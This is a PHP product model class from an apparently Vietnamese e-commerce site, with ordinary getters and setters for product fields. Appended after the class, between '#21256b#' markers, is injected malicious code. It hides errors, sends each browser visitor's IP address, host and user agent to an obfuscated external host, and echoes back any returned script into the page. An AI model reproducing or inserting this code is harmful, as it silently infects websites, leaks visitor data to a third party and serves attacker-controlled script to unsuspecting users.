<?php
//error_reporting(0);
if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * @author hoang
 */
class MbProductModel {
	private $_id = NULL;
	private $_name = NULL;
	private $_price = NULL;
	private $_image_path = NULL;
	private $_image_default = NULL;
	private $_image_thumbnail = NULL;
	private $_status = NULL;
	private $_description = NULL;
	private $_technicalDescription = NULL;
	private $_category = NULL;
	private $_user_id = NULL;
	private $_date = NULL;
	private $_pageView = 0;
	private $_store_cat_id = NULL;

	public function getId()
	{
	    return $this->_id;
	}

	public function setId($id)
	{
	    $this->_id = $id;
	}
	
	public function getUserId()
	{
	    return $this->_user_id;
	}

	public function setUserId($userid)
	{
	    $this->_user_id = $userid;
	}
	
	public function getCategory()
	{
	    return $this->_category;
	}

	public function setCategory($category)
	{
	    $this->_category = $category;
	}

	public function getNiceName()
	{
		mb_language('uni'); 
		mb_internal_encoding('UTF-8');
		/*$coDau=array("à","á","ạ","ả","ã","â","ầ","ấ","ậ","ẩ","ẫ","ă","ằ","ắ"
			,"ặ","ẳ","ẵ","è","é","ẹ","ẻ","ẽ","ê","ề","ế","ệ","ể","ễ","ì","í","ị","ỉ","ĩ",
			"ò","ó","ọ","ỏ","õ","ô","ồ","ố","ộ","ổ","ỗ","ơ"
			,"ờ","ớ","ợ","ở","ỡ",
			"ù","ú","ụ","ủ","ũ","ư","ừ","ứ","ự","ử","ữ",
			"ỳ","ý","ỵ","ỷ","ỹ",
			"đ",
			"À","Á","Ạ","Ả","Ã","Â","Ầ","Ấ","Ậ","Ẩ","Ẫ","Ă"
			,"Ằ","Ắ","Ặ","Ẳ","Ẵ",
			"È","É","Ẹ","Ẻ","Ẽ","Ê","Ề","Ế","Ệ","Ể","Ễ",
			"Ì","Í","Ị","Ỉ","Ĩ",
			"Ò","Ó","Ọ","Ỏ","Õ","Ô","Ồ","Ố","Ộ","Ổ","Ỗ","Ơ"
			,"Ờ","Ớ","Ợ","Ở","Ỡ",
			"Ù","Ú","Ụ","Ủ","Ũ","Ư","Ừ","Ứ","Ự","Ử","Ữ",
			"Ỳ","Ý","Ỵ","Ỷ","Ỹ",
			"Đ","ê","ù","à");*/
		$this->_name=trim($this->_name);
		if (strlen($this->_name)>=25) {
	    	$substr = substr($this->_name,0,25);
			/*if (in_array($substr[19],$coDau) && in_array($substr[18],$coDau)) {
				$substr = substr($this->_name,0,18);
			}
			else
			if (in_array($substr[19],$coDau) || in_array($substr[18],$coDau) || in_array($substr[19].$substr[18],$coDau)) {
				$substr = substr($this->_name,0,19);
			}*/			
			return $substr.'...';
		}
		else {
			return $this->_name;
		}
	}
	
	public function getName()
	{
		return $this->_name;
	}

	public function setName($name)
	{
	    $this->_name = $name;
	}
	
	public function getPrice() {
		return $this->_price;
	}
	
	public function getNicePrice()
	{
		if (intval($this->_price)==0) {
			return 0;
		}
		$price = strrev($this->_price);
		$arr = str_split($price,3);
		$result = implode(".", $arr);
		$result= strrev($result);
	    return $result;
	}

	public function setPrice($price)
	{
	    $this->_price = $price;
	}	
	
	public function getImagePath()
	{
	    return $this->_image_path;
	}

	public function setImagePath($image_path)
	{
	    $this->_image_path = $image_path;
	}

	public function getImageDefault()
	{
	    return $this->_image_default;
	}

	public function setImageDefault($image_default)
	{
	    $this->_image_default = $image_default;
	}
	
	public function getImageThumbNail()
	{
	    return $this->_image_thumbnail;
	}

	public function setImageThumbNail($image_thumbnail)
	{
	    $this->_image_thumbnail = $image_thumbnail;
	}

	public function getStatus()
	{
	    return $this->_status;
	}

	public function setStatus($status)
	{
	    $this->_status = $status;
	}

	public function getDescription()
	{
	    return $this->_description;
	}

	public function setDescription($description)
	{
	    $this->_description = $description;
	}

	public function getTechnicalDescription()
	{
	    return $this->_technicalDescription;
	}

	public function setTechnicalDescription($technicalDescription)
	{
	    $this->_technicalDescription = $technicalDescription;
	}	
	
	public function getDate() {
		return $this->_date;
	}
	
	public function setDate($date) {
		$this->_date = $date;
	}
	
	public function getPageView() {
		return $this->_pageView;
	}
	
	public function setPageView($pageView) {
		$this->_pageView = $pageView;
	}	
	
	public function getStoreCatId() {
		return $this->_store_cat_id;
	}
	
	public function setStoreCatId($store_cat_id) {
		$this->_store_cat_id = $store_cat_id;
	}		
}

#21256b#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/21256b#
